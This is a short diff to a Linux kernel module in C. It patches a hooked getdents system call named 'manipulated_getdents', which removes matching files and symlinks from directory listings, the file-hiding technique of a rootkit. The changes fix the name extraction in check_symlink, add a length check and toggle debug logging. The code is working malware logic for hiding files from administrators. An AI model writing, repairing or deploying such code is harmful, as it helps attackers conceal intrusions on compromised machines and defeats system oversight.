@@ -71,9 +71,16 @@ int check_symlink(char *path)
 	char *ptr, *name;
 	char delimiter = '/';
 	
+	printk(KERN_INFO "Enter symlink: %s\n", path);
 	ptr = strrchr(path, delimiter);
-	name = ptr;
+	name = ptr + 1;
+	
+	if(ptr == NULL)
+	{
+		return 0;
+	}
 
+	printk(KERN_INFO "Exit symlink: %s\n", name);
 	return hide(name);
 }
 
@@ -141,7 +148,7 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 		memcpy(buf, path, path_len);
 		memcpy(buf+path_len, dirp->d_name, strlen(dirp->d_name));
 		memset(buf+path_len+strlen(dirp->d_name)+1, '\0', 1);
-		printk(KERN_INFO "Currently parsing file %s\n", buf);
+		//printk(KERN_INFO "Currently parsing file %s\n", buf);
 		
 
 		old_fs = get_fs();
@@ -156,7 +163,7 @@ asmlinkage int manipulated_getdents (unsigned int fd, struct linux_dirent __user
 		
 
 		/* Check if we need to hide this symlink */
-		if(check_symlink(lpath))
+		if(lpath_len > 0 && check_symlink(lpath))
 		{
 			memmove(dirp, (char*) dirp + dirp->d_reclen,tlen);
 			ret -= len;
